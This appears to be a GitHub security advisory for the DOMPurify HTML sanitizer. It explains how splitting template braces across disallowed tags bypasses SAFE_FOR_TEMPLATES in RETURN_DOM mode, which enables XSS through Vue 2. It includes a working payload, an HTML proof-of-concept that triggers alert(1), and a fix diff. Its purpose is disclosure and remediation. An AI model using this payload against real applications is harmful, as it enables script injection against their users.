# [M] DOMPurify has a SAFE_FOR_TEMPLATES bypass in RETURN_DOM mode

## Summary
Severity: Medium
Advisory: GHSA-crv5-9vww-q3g8
CVE: CVE-2026-41239
CWE: CWE-1289, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-crv5-9vww-q3g8
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=1.0.10 <3.4.0

## Details
## Summary

| Field | Value |
|:------|:------|
| **Severity** | Medium |
| **Affected** | DOMPurify `main` at [`883ac15`](https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6), introduced in v1.0.10 ([`7fc196db`](https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec)) |

`SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2.

## Technical Details

DOMPurify strips template expressions in two passes:

1. **Per-node** — each text node is checked during the tree walk ([`purify.ts:1179-1191`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191)):

```js
// pass #1: runs on every text node during tree walk
if (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {
  content = currentNode.textContent;
  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -> ' '
  content = content.replace(ERB_EXPR, ' ');        // <%...%> -> ' '
  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -> ' '
  currentNode.textContent = content;
}
```

2. **Final string scrub** — after serialization, the full HTML string is scrubbed again ([`purify.ts:1679-1683`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683)). This is the safety net that catches expressions that only form after the DOM settles.

The `RETURN_DOM` path returns before pass #2 ever runs ([`purify.ts:1637-1661`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661)):

```js
// purify.ts (simplified)

if (RETURN_DOM) {
  // ... build returnNode ...
  return returnNode;        // <-- exits here, pass #2 never runs
}

// pass #2: only reached by string-mode callers
if (SAFE_FOR_TEMPLATES) {
  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');
}
return serializedHTML;
```

The payload `{<foo></foo>{constructor.constructor('alert(1)')()}<foo></foo>}` exploits this:

1. Parser creates: `TEXT("{")` → `<foo>` → `TEXT("{payload}")` → `<foo>` → `TEXT("}")` — no single node contains `{{`, so pass #1 misses it
2. `<foo>` is not allowed, so DOMPurify removes it but keeps surrounding text
3. The three text nodes are now adjacent — `.outerHTML` reads them as `{{payload}}`, which Vue 2 compiles and executes

## Reproduce

Open the following html in any browser and `alert(1)` pops up.

```html
<!DOCTYPE html>
<html>

<body>
  <script src="https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js"></script>
  <script>
    var dirty = '<div id="app">{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>';
    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });
    document.body.appendChild(dom.firstChild);
    new Vue({ el: '#app' });
  </script>
</body>

</html>
```

## Impact

Any application that sanitizes attacker-controlled HTML with `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `RETURN_DOM_FRAGMENT: true`), then mounts the result into a template-evaluating framework, is vulnerable to XSS.

## Recommendations

### Fix

`normalize()` merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both `RETURN_DOM` and `RETURN_DOM_FRAGMENT`.

```diff
     if (RETURN_DOM) {
+      if (SAFE_FOR_TEMPLATES) {
+        body.normalize();
+        let html = body.innerHTML;
+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {
+          html = stringReplace(html, expr, ' ');
+        });
+        body.innerHTML = html;
+      }
+
       if (RETURN_DOM_FRAGMENT) {
         returnNode = createDocumentFragment.call(body.ownerDocument);
```

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8
- https://nvd.nist.gov/vuln/detail/CVE-2026-41239
- https://github.com/cure53/DOMPurify
- https://github.com/cure53/DOMPurify/releases/tag/3.4.0
